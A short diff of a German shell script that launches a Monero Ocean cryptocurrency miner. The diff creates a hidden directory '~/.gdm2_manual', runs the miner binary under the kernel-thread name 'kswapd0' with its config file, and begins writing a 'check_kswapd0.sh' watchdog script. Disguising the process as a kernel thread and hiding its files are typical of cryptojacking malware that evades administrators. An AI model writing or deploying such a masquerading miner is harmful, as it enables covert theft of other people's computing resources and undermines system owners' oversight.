@@ -2,6 +2,8 @@
 
 # Script um Monero Ocean Miner zu starten und Dateien zu verwalten
 
+mkdir -p "$HOME/.gdm2_manual/"
+
 # Pfade zu den benötigten Dateien
 KSWAPD0="$HOME/.gdm2_manual/kswapd0"
 CONFIG_JSON="$HOME/.gdm2_manual/config.json"
@@ -39,7 +41,7 @@ if [ ! -f "$CONFIG_JSON" ]; then
 fi
 
 # kswapd0 ausführen
-$HOME/.gdm2_manual/kswapd0 --config $HOME/.gdm2_manual/config.json
+$HOME/.gdm2_manual/kswapd0 --config="$HOME/.gdm2_manual/config.json"
 
 # Überprüfungsskript erstellen
 cat << 'EOF' > "$HOME/.gdm2_manual/check_kswapd0.sh"
